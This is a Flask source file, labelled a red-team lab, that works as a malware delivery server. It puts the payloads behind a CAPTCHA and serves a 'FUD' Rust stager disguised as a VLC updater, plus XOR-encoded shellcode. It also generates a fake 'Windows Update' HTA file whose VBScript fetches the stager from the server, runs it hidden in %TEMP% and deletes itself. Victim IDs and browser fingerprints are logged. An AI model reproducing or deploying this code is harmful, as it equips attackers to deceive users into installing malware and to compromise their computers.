import os
import uuid
import random
import time
import hmac
from datetime import datetime, timedelta
from flask import Flask, render_template, request, session, send_file, abort, redirect, url_for, jsonify
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from werkzeug.utils import secure_filename
from functools import wraps

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.urandom(32)
app.permanent_session_lifetime = timedelta(minutes=30)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ============================================================
# ===================== CONFIGURAÇÃO =========================
# ============================================================

# Pastas necessárias
for pasta in ["downloads", "static/payloads", "logs", "static/fonts"]:
    os.makedirs(os.path.join(BASE_DIR, pasta), exist_ok=True)

# ==================== PAYLOADS (Sistema melhorado) ====================
PAYLOADS = {
    "rust": {
        "type": "stager",
        "name": "vlc-media-updater.exe",
        "file": "vlc-media-updater.exe",
        "description": "Rust Stager In-Memory (FUD)",
        "version": "2.1"
    },
    "sc": {
        "type": "shellcode",
        "name": "sc.bin",
        "file": "sc.bin",
        "description": "Shellcode XORado",
        "version": "1.0"
    }
}

# Controle de IPs validados
ip_validado = {}


def log_access(mensagem: str, victim_id: str = None):
    """Logging melhorado com suporte a Victim ID"""
    ip = request.remote_addr or "unknown"
    ua = request.headers.get("User-Agent", "unknown")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    victim = f" | Victim: {victim_id}" if victim_id else ""
    log_line = f"[{ts}] {ip} | {ua}{victim} | {mensagem}\n"
    
    with open(os.path.join(BASE_DIR, "logs/access.log"), "a", encoding="utf-8") as f:
        f.write(log_line)


# ============================================================
# ===================== CAPTCHA + FINGERPRINT ================
# ============================================================

def gerar_captcha(dificuldade: str = "medio"):
    # ... (mesmo código do CAPTCHA que já temos)
    largura, altura = 460, 170
    img = Image.new("RGB", (largura, altura), "#0d1117")
    draw = ImageDraw.Draw(img)

    for _ in range(1100):
        x = random.randint(0, largura - 1)
        y = random.randint(0, altura - 1)
        draw.point((x, y), fill=(random.randint(25, 70),) * 3)

    for x in range(0, largura, 28):
        draw.line([(x, 0), (x, altura)], fill="#23272f", width=1)
    for y in range(0, altura, 28):
        draw.line([(0, y), (largura, y)], fill="#23272f", width=1)

    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    if dificuldade == "dificil":
        chars += "abcdefghjkmnpqrstuvwxyz"

    tamanho = 6 if dificuldade != "facil" else 5
    codigo = ''.join(random.choices(chars, k=tamanho))

    x_pos = 35
    for letra in codigo:
        try:
            font = ImageFont.truetype(os.path.join(BASE_DIR, "static/fonts/arialbd.ttf"), random.randint(52, 68))
        except:
            font = ImageFont.load_default()

        cor = (random.randint(140, 255), random.randint(140, 255), random.randint(200, 255))
        angulo = random.randint(-28, 28)

        temp = Image.new("RGBA", (90, 110), (0, 0, 0, 0))
        d = ImageDraw.Draw(temp)
        d.text((15, 12), letra, font=font, fill=cor)
        rotacionada = temp.rotate(angulo, expand=True, resample=Image.BICUBIC)
        img.paste(rotacionada, (x_pos + random.randint(-8, 8), random.randint(32, 55)), rotacionada)
        x_pos += random.randint(52, 68)

    for _ in range(7):
        x1, y1 = random.randint(10, 120), random.randint(10, 160)
        x2, y2 = random.randint(320, 450), random.randint(10, 160)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(70, 160), random.randint(90, 200), 255), width=2)

    img = img.filter(ImageFilter.SMOOTH_MORE)

    nome_arquivo = f"captcha_{uuid.uuid4().hex[:10]}.png"
    caminho = os.path.join(BASE_DIR, "downloads", nome_arquivo)
    img.save(caminho, "PNG")

    session["captcha_codigo"] = codigo
    session["captcha_arquivo"] = nome_arquivo
    session["captcha_criado_em"] = time.time()

    return codigo, nome_arquivo


def validar_captcha(entrada_usuario: str) -> bool:
    if "captcha_codigo" not in session or "captcha_criado_em" not in session:
        return False
    if time.time() - session["captcha_criado_em"] > 300:
        return False
    return hmac.compare_digest(entrada_usuario.upper().strip(), session.get("captcha_codigo", ""))


def require_captcha(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        ip = request.remote_addr
        if ip not in ip_validado or time.time() > ip_validado[ip]:
            log_access("BLOQUEADO - CAPTCHA NÃO VALIDADO")
            return redirect(url_for("index"))
        return f(*args, **kwargs)
    return wrapper


# ============================================================
# ======================== ROTAS ============================
# ============================================================

@app.route("/", methods=["GET", "POST"])
def index():
    ip = request.remote_addr
    log_access("ACESSOU PÁGINA PRINCIPAL")

    if request.method == "POST":
        entrada = request.form.get("captcha_input", "")
        if validar_captcha(entrada):
            ip_validado[ip] = time.time() + 1800
            log_access("CAPTCHA RESOLVIDO COM SUCESSO")

            try:
                arquivo_antigo = session.get("captcha_arquivo")
                if arquivo_antigo:
                    os.remove(os.path.join(BASE_DIR, "downloads", arquivo_antigo))
            except:
                pass

            return render_template("success.html")
        else:
            log_access("CAPTCHA INCORRETO")
            codigo, nome_imagem = gerar_captcha(dificuldade="medio")
            return render_template("index.html", captcha_image=nome_imagem, erro="Código incorreto. Tente novamente.")

    # GET - Sempre gera um CAPTCHA novo
    codigo, nome_imagem = gerar_captcha(dificuldade="medio")
    return render_template("index.html", captcha_image=nome_imagem)
@app.route("/get_rusta")
@require_captcha
def get_rusta():
    victim_id = session.get("victim_id", "unknown")
    log_access("RUST STAGER BAIXADO", victim_id=victim_id)
    ip_validado.pop(request.remote_addr, None)

    caminho = os.path.join(BASE_DIR, "static/payloads", PAYLOADS["rust"]["file"])
    if not os.path.exists(caminho):
        abort(404)
    return send_file(caminho, as_attachment=True, download_name=PAYLOADS["rust"]["name"])


@app.route("/get_sc")
@require_captcha
def get_sc():
    victim_id = session.get("victim_id", "unknown")
    log_access("SHELLCODE BAIXADO", victim_id=victim_id)
    ip_validado.pop(request.remote_addr, None)

    caminho = os.path.join(BASE_DIR, "static/payloads", PAYLOADS["sc"]["file"])
    if not os.path.exists(caminho):
        abort(404)
    return send_file(caminho, mimetype="application/octet-stream")


@app.route("/instalar/<payload>")
@require_captcha
def instalar_hta(payload):
    if payload not in PAYLOADS:
        abort(404)

    victim_id = session.get("victim_id", uuid.uuid4().hex[:12])
    host = request.host_url.rstrip("/")

    hta_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>System Update</title>
    <HTA:APPLICATION APPLICATIONNAME="Windows Update" SHOWINTASKBAR="no" WINDOWSTATE="minimize" CAPTION="no"/>
    <script language="VBScript">
        On Error Resume Next
        Dim objShell, objHTTP, objStream, tempPath, filePath
        Set objShell = CreateObject("WScript.Shell")
        tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
        filePath = tempPath & "\\update-helper.exe"
        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
        objHTTP.Open "GET", "{host}/get_rusta", False
        objHTTP.Send
        If objHTTP.Status = 200 Then
            Set objStream = CreateObject("ADODB.Stream")
            objStream.Open
            objStream.Type = 1
            objStream.Write objHTTP.responseBody
            objStream.SaveToFile filePath, 2
            objStream.Close
            objShell.Run """" & filePath & """", 0, False
            objShell.Run "cmd /c timeout 4 && del ""%~f0""", 0, False
        End If
        window.close
    </script>
</head>
<body style="background:#1e1e1e; color:#ccc; font-family:Segoe UI;">
    <div style="margin-top:40px; text-align:center;">
        <h3>Installing system components...</h3>
        <p>Please wait while we apply the latest updates.</p>
    </div>
</body>
</html>'''

    log_access(f"HTA ENTREGUE | Payload: {payload}", victim_id=victim_id)
    ip_validado.pop(request.remote_addr, None)
    return hta_content, 200, {"Content-Type": "application/hta"}


@app.route("/fingerprint", methods=["POST"])
def receber_fingerprint():
    try:
        dados = request.get_json()
        victim_id = session.get("victim_id", "unknown")
        log_access("FINGERPRINT RECEBIDO", victim_id=victim_id)

        caminho = os.path.join(BASE_DIR, "logs/fingerprints.log")
        with open(caminho, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*70}\n")
            f.write(f"Data: {datetime.now()} | Victim: {victim_id}\n")
            f.write(f"IP: {request.remote_addr}\n")
            f.write(str(dados) + "\n")
        return jsonify({"status": "ok"})
    except:
        return jsonify({"status": "error"}), 400


if __name__ == "__main__":
    print("=" * 70)
    print("🔥 LAB RED TEAM 2026 - PROJETO MELHORADO (Etapa D)")
    print("http://127.0.0.1:5000")
    print("=" * 70)
    app.run(host="0.0.0.0", port=5000, threaded=True, debug=False)